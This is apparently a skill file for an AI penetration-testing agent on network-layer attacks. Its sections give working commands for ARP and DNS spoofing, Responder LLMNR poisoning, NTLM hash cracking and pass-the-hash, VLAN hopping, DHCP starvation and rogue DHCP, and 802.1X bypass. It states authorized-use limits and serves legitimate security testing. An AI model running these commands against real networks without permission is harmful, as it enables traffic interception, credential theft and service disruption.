---
name: network-attacks
description: "Network layer attacks: ARP spoofing, LLMNR/NBT-NS poisoning, VLAN hopping, DHCP attacks, DNS spoofing, and 802.1X bypass"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["arp spoofing", "llmnr poisoning", "nbt ns poisoning", "vlan hopping", "dhcp attack", "dns spoofing", "802.1x bypass", "mitm attack", "network sniffing", "layer 2 attack", "network poisoning"]
mitreAttack: ["T1557", "T1040", "T1558"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Network Attacks

## When to Use

- You are conducting an internal network penetration test
- You have access to the internal network and need to assess Layer 2/3 security
- You need to test whether network segmentation prevents lateral movement
- Assessing whether authentication protocols protect against credential theft

## Do Not Use

- Against networks you do not own or have permission to test
- To disrupt network services or cause denial of service
- To intercept traffic beyond the agreed engagement scope

## Auth Context

Network attacks require internal network access. For any HTTP-based services discovered, use **httpRequest** with **getCapturedHeaders** for auth context.

---

## ARP Spoofing

### Bettercap

```bash
# Start ARP spoofing
sudo bettercap -iface eth0
bettercap> set arp.spoof.targets 192.168.1.100
bettercap> arp.spoof on
bettercap> net.sniff on
```

### arpspoof (dsniff)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof target
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# In another terminal, spoof gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

### MITM Intercept

```bash
# After ARP spoofing, intercept traffic
# - Wireshark: capture and analyze
# - mitmproxy: intercept HTTP/HTTPS
# - SSLStrip: downgrade HTTPS to HTTP
# - Bettercap: built-in sniffing
```

---

## LLMNR/NBT-NS Poisoning

### Responder

```bash
# Start Responder
sudo responder -I eth0 -wrf

# Responder listens for:
# - LLMNR (Link-Local Multicast Name Resolution)
# - NBT-NS (NetBIOS Name Service)
# - mDNS (multicast DNS)

# Captures:
# - NTLMv1/v2 hashes
# - WPAD configuration
# - SMB authentication attempts
```

### Hash Cracking

```bash
# Crack NTLMv2 hashes
hashcat -m 5600 hashes.txt wordlist.txt

# Use captured hashes for pass-the-hash
impacket-smbclient DOMAIN/user@TARGET -hashes aad3b435...:31d6cfe0...
```

---

## DNS Spoofing

### Ettercap

```bash
# Start DNS spoofing
sudo ettercap -G
# Sniff → Unified sniffing → Start
# Hosts → Scan for hosts → Select targets
# Mitm → ARP poisoning → Select targets
# Plugins → Manage plugins → Enable dns_spoof
# Start → Start sniffing
```

### Bettercap

```bash
bettercap> set dns.spoof.domains target.com
bettercap> set dns.spoof.address 192.168.1.100
bettercap> dns.spoof on
```

---

## VLAN Hopping

### Switch Spoofing

```bash
# Create DTP frames to negotiate trunk
# Tool: Yersinia
yersinia dtp -attack 1 -interface eth0

# Or use frogger.sh
# Sends DTP Dynamic Trunking frames
# Switch negotiates trunk link
# Attacker can access all VLANs
```

### Double Tagging

```bash
# Frame with two 802.1Q tags
# First tag: attacker's VLAN (removed by first switch)
# Second tag: target VLAN (processed by second switch)
# Requires: attacker on native VLAN
```

---

## DHCP Attacks

### DHCP Starvation

```bash
# Exhaust DHCP address pool
# Tool: yersinia
yersinia dhcp -attack 1 -interface eth0

# Or custom script
for i in $(seq 1 254); do
  dhclient -v -r eth0  # Release
  dhclient -v eth0     # Request new
done
```

### DHCP Spoofing

```bash
# Run rogue DHCP server
# Tool: Responder
sudo responder -I eth0 -d

# Or dnsmasq
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1  # Gateway = attacker
dhcp-option=6,192.168.1.1  # DNS = attacker
```

---

## 802.1X / NAC Bypass

### MAC Authentication Bypass (MAB)

```bash
# If switch uses MAC-based auth
# Clone authorized device MAC address
macchanger -m AA:BB:CC:DD:EE:FF eth0

# Or use macof to flood
macof -i eth0
```

### EAP Relay

```bash
# Tools: eaphammer, hostapd-mana
# Create rogue access point
# Relay EAP authentication to legitimate RADIUS
# Capture credentials
```

---

## Network Scanning

### Internal Recon

```bash
# Discover live hosts
nmap -sn 192.168.1.0/24

# Port scan
nmap -sS -sV -O 192.168.1.0/24

# Service discovery
nmap -sV -p- 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# SMB enumeration
nmap -p 445 --script=smb-enum-shares,smb-enum-users 192.168.1.100
```

---

## Cheat Sheet — Quick Reference

| Attack | Tool | Requirement |
|--------|------|-------------|
| ARP Spoofing | Bettercap, arpspoof | Layer 2 access |
| LLMNR/NBT-NS | Responder | Internal network |
| DNS Spoofing | Bettercap, Ettercap | ARP spoofing first |
| VLAN Hopping | Yersinia | Trunk port or DTP |
| DHCP Starvation | Yersinia | Layer 2 access |
| 802.1X Bypass | eaphammer | Physical access |
| NTLM Hash Crack | hashcat | Captured hash |

---

## Anti-Hallucination

- ARP spoofing requires Layer 2 access — it does not work across routed networks
- LLMNR/NBT-NS poisoning requires these protocols to be enabled (often disabled in hardened environments)
- VLAN hopping requires specific switch configurations (DTP enabled, native VLAN misconfiguration)
- 802.1X bypass depends on the specific authentication method (EAP-MD5 is weak, EAP-TLS is strong)
- Document the exact network segment, switch configuration, and protocol settings for each finding
